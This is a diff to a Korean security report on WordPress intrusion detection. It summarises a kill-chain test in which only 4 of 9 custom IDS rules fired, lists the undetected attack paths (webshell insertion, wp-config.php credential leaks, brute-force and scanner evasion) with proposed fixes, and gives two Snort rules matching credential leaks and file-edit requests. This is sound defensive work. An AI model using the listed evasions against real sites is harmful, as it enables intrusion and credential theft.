-| 중간 | DB 접근 이상 | MySQL 로그 수집 | 접근 패턴 기반 이상 탐지 Alert 추가 |
+> 실제 킬체인 공격 결과, 커스텀 룰 **9개 중 4개(44%)만 탐지 성공**.  
+> 시그니처 기반 IDS만으로는 **우회 공격 경로를 탐지할 수 없음**이 확인됨.
+
+| 우선순위 | 미탐지 공격 | 현재 한계 | 개선안 | 구현 난이도 |
+|---------|-----------|---------|--------|-----------|
+| **긴급** | 웹쉘 삽입 (파일 편집) | multipart 업로드만 탐지 | OSSEC/Wazuh HIDS — PHP 파일 변경 시 실시간 경보 | 중 |
+| **긴급** | wp-config.php 인증정보 유출 | 탐지 룰 없음 | Snort 신규 룰: 응답에 `DB_PASSWORD` 패턴 탐지 | 하 |
+| **높음** | 허용 포트(3306) 악용 | 네트워크 룰 범위 밖 | MySQL Audit Plugin + Splunk 비정상 쿼리 탐지 | 중 |
+| **높음** | admin-ajax.php 경유 공격 | CVE URI 패턴만 탐지 | File Manager AJAX action 패턴 추가 룰 작성 | 하 |
+| 중간 | 분산 브루트포스 | 단일 IP threshold | Splunk 통계 기반 다중 IP 브루트포스 탐지 | 중 |
+| 중간 | WPScan UA 우회 | UA 고정 탐지 | 요청 속도 + URI 다양성 행위 패턴 (Splunk) | 상 |
+| 참고 | 유출 차단 | pfSense 차단 동작 중 | 차단 로그 → Splunk Alert 연동으로 관제 가시성 확보 | 하 |
+
+### 제안: 추가 Snort 룰 2개
+
+```
+# SID 1000010: wp-config.php 인증정보 유출 탐지 (응답 방향)
+alert tcp $HOME_NET $HTTP_PORTS -> any any ( \
+    msg:"[LOCAL] wp-config.php Credential Leak in Response"; \
+    flow:from_server,established; \
+    content:"DB_PASSWORD"; content:"DB_USER"; distance:0; within:200; \
+    classtype:web-application-attack; \
+    sid:1000010; rev:1; )
+
+# SID 1000011: WordPress 관리자 파일 편집 API 탐지
+alert tcp any any -> $HOME_NET $HTTP_PORTS ( \
+    msg:"[LOCAL] WordPress Plugin/Theme File Edit via Admin"; \
+    flow:to_server,established; \
+    content:"POST"; http_method; \
+    content:"/wp-admin/"; http_uri; \
+    content:"action=edit-theme-plugin-file"; http_client_body; \
+    classtype:web-application-attack; \
+    sid:1000011; rev:1; )
+```
 
 ---
 
